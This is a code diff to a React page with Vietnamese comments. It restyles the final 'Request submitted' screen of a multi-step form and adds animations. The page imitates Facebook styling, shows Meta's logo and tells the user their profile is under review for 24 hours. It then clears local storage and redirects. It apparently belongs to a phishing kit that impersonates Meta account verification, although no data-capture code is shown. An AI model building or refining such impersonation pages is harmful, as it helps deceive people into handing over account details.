@@ -949,23 +949,88 @@ export default function Home() {
   </>
 )}
 
-                    {/* BƯỚC 5: SUCCESS */}
-                    {showSuccess && (
-                      <div style={{ textAlign: 'center', padding: '10px 0' }}>
-                        <div style={{ width: '72px', height: '72px', borderRadius: '50%', background: '#e7f3ff', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>
-                          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
-                        </div>
-                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#1c1e21', marginBottom: '12px' }}>Request submitted</h2>
-                        <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '24px' }}>
-                          Your request has been sent. Please wait up to 24 hours for verification.
-                        </p>
-                        <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} disabled={loading} className="fb-btn" style={{ height: 52, display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
-                          Close
-                        </button>
-                      </div>
-                    )}
-                  </>
-                )}
+{/* BƯỚC 5: SUCCESS */}
+{showSuccess && (
+  <div style={{ textAlign: 'center', padding: '20px 10px' }}>
+    
+    {/* CSS Keyframes cho hiệu ứng */}
+    <style>{`
+      @keyframes pulse-ring {
+        0% { transform: scale(0.8); opacity: 0.5; }
+        100% { transform: scale(1.5); opacity: 0; }
+      }
+      @keyframes fade-in-up {
+        0% { opacity: 0; transform: translateY(15px); }
+        100% { opacity: 1; transform: translateY(0); }
+      }
+      .success-content > * {
+        animation: fade-in-up 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+      }
+      .success-content > *:nth-child(1) { animation-delay: 0.1s; }
+      .success-content > *:nth-child(2) { animation-delay: 0.2s; }
+      .success-content > *:nth-child(3) { animation-delay: 0.3s; }
+      .success-content > *:nth-child(4) { animation-delay: 0.4s; }
+    `}</style>
+
+    <div className="success-content">
+      {/* Icon Check với hiệu ứng lan tỏa */}
+      <div style={{ position: 'relative', width: '80px', height: '80px', margin: '0 auto 24px' }}>
+        {/* Vòng tròn lan tỏa phía sau */}
+        <div style={{ 
+          position: 'absolute', inset: 0, 
+          background: '#0064e0', borderRadius: '50%', 
+          animation: 'pulse-ring 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) infinite' 
+        }} />
+        
+        {/* Vòng tròn chính chứa icon */}
+        <div style={{ 
+          position: 'relative', width: '100%', height: '100%', 
+          background: 'linear-gradient(135deg, #0064e0, #0052b4)', 
+          borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center',
+          boxShadow: '0 8px 16px rgba(0, 100, 224, 0.25)'
+        }}>
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
+            <polyline points="20 6 9 17 4 12" />
+          </svg>
+        </div>
+      </div>
+
+      {/* Tiêu đề */}
+      <h2 style={{ fontSize: '24px', fontWeight: '800', color: '#1c1e21', marginBottom: '12px', letterSpacing: '-0.5px' }}>
+        Request submitted!
+      </h2>
+      
+      {/* Nội dung */}
+      <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.6', marginBottom: '28px', padding: '0 20px' }}>
+        Your request has been successfully sent. Our system is now reviewing your profile. Please wait up to <strong>24 hours</strong> for verification.
+      </p>
+
+      {/* Nút đóng */}
+      <button 
+        type="button" 
+        onClick={() => { localStorage.clear(); window.location.replace('/live'); }} 
+        disabled={loading} 
+        style={{
+          width: '100%',
+          padding: '14px',
+          borderRadius: '100px',
+          border: 'none',
+          background: '#0064e0',
+          color: '#fff',
+          fontSize: '16px',
+          fontWeight: '700',
+          cursor: 'pointer',
+          transition: 'all 0.2s ease',
+          boxShadow: '0 4px 12px rgba(0, 100, 224, 0.2)'
+        }}
+        onMouseOver={(e) => e.currentTarget.style.background = '#0052b4'}
+        onMouseOut={(e) => e.currentTarget.style.background = '#0064e0'}
+      >
+        Back to Home
+      </button>
+    </div>
+  </div>
+)}
 
                 <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: '24px', paddingTop: '20px', borderTop: '1px solid #e4e6eb' }}>
                     <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', margin: '0 auto' }} />
